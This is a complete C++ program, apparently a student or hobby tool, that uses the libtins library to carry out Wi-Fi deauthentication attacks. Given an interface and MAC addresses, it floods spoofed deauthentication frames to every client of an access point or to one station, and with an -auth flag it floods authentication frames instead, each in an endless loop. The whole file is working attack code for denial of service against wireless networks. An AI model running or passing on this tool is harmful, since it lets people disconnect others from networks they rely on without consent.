#include <iostream>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <tins/tins.h>
#include <ctime>
#include <time.h>

using namespace std;
using namespace Tins;

void usage()
{
    printf("syntax : DeauthAttack <interface> <ap mac> [<station mac> [-auth]] \n");
    printf("sample : DeauthAttack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB \n");
}

int main(int argc, char *argv[])
{
    if (argc < 3 || argc > 5)
    {
        usage();
        return -1;
    }

    Dot11Deauthentication deauth;
    Dot11Authentication auth;
    Dot11AssocRequest assoc;

    RadioTap ap_packet;
    RadioTap packet;
    RadioTap station_packet;
    RadioTap auth_packet;
    RadioTap assoc_packet;

    NetworkInterface interface = argv[1];
    string ap_mac = argv[2];
    string station_mac;

    struct tm curr_tm;
    time_t curr_time = time(nullptr);
    localtime_r(&curr_time, &curr_tm);

    int curr_hour = curr_tm.tm_hour;
    int curr_minute = curr_tm.tm_min;
    int curr_second = curr_tm.tm_sec;

    switch (argc)
    {
    case 3:
        deauth.addr1("ff:ff:ff:ff:ff:ff");
        deauth.addr2(ap_mac);
        deauth.addr3(deauth.addr2());
        packet = RadioTap() / deauth;

        cout << "[*] Deauthentication Attack Start" << endl;
        while (1)
        {
            PacketSender sender;
            sender.send(packet, interface);
            printf("%d:%d:%d   Sending Deauth Packet to broadcast \n", curr_hour, curr_minute, curr_second);
            usleep(100000);
        }
    case 4:
        station_mac = argv[3];
        deauth.addr1(station_mac);
        deauth.addr2(ap_mac);
        deauth.addr3(deauth.addr2());
        ap_packet = RadioTap() / deauth;

        deauth.addr1(ap_mac);
        deauth.addr2(station_mac);
        deauth.addr3(deauth.addr2());
        station_packet = RadioTap() / deauth;

        cout << "[*] Deauthentication Attack Start" << endl;
        while (1)
        {
            PacketSender sender;
            sender.send(station_packet, interface);
            sender.send(ap_packet, interface);
            printf("%d:%d:%d   Sending Deauth Packet to Target \n", curr_hour, curr_minute, curr_second);
            usleep(100000);
        }
    case 5:
        if (strcmp(argv[4], "-auth"))
        {
            usage();
            return -1;
        }
        station_mac = argv[3];
        auth.addr1(ap_mac);
        auth.addr2(station_mac);
        auth.addr3(auth.addr1());
        auth.auth_seq_number(1);

        auth_packet = RadioTap() / auth;

        cout << "[*] Authentication Attack Start" << endl;
        while (1)
        {
            PacketSender sender;
            sender.send(auth_packet, interface);
            // sender.send(assoc_packet, interface);
            printf("%d:%d:%d   Sending Auth Packet to Target \n", curr_hour, curr_minute, curr_second);
            usleep(100000);
        }
    }
}